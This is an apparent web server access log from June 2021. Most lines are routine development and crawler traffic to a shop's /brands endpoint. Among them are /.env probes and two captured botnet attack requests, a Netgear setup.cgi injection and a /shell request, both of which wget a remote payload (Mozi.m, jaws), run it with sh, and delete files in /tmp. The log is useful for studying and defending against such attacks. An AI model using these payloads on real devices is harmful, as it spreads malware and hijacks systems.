199.19.224.153 - - [06/Jun/2021:00:34:20 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
5.8.10.202 - - [06/Jun/2021:00:53:32 +0000] "GET / HTTP/1.1" 200 1851 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5350 (KHTML, like Gecko) Chrome/22.0.824.0 Safari/5350"
103.123.66.194 - - [06/Jun/2021:00:56:56 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.123.66.194 - - [06/Jun/2021:00:57:06 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
58.249.85.41 - - [06/Jun/2021:01:26:46 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.249.85.41:44901/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
84.17.59.81 - - [06/Jun/2021:02:07:46 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
84.17.59.81 - - [06/Jun/2021:02:07:47 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
220.125.84.28 - - [06/Jun/2021:02:09:51 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 116.202.106.221/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
117.222.83.139 - - [06/Jun/2021:02:30:44 +0000] "GET / HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:30:44 +0000] "GET / HTTP/1.1" 200 203 "http://productservice.wokoshop.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:30:44 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://productservice.wokoshop.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:30:44 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://productservice.wokoshop.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:30:47 +0000] "GET /brands HTTP/1.1" 200 27648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
34.229.145.138 - - [06/Jun/2021:02:32:08 +0000] "GET /app-ads.txt HTTP/1.1" 404 162 "-" "Jersey/2.25.1 (HttpUrlConnection 1.8.0_141)"
117.222.83.139 - - [06/Jun/2021:02:34:33 +0000] "GET /brands HTTP/1.1" 200 27648 "http://localhost:4200/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:35:09 +0000] "GET /brands HTTP/1.1" 200 27648 "http://localhost:4200/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:36:23 +0000] "GET /brands HTTP/1.1" 200 27648 "http://localhost:4200/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:36:23 +0000] "GET /brands HTTP/1.1" 200 27648 "http://localhost:4200/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:43:39 +0000] "GET /brands HTTP/1.1" 200 27648 "http://localhost:4200/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:44:09 +0000] "GET / HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:44:10 +0000] "GET / HTTP/1.1" 200 203 "http://productservice.wokoshop.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
117.222.83.139 - - [06/Jun/2021:02:44:12 +0000] "GET /brands HTTP/1.1" 200 27648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41"
157.55.39.24 - - [06/Jun/2021:02:45:44 +0000] "GET / HTTP/1.1" 200 132 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
117.222.83.139 - - [06/Jun/2021:02:45:46 +0000] "GET /brands HTTP/1.1" 200 27648 "http://localhost:4200/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36 Edg/91.0.864.41"
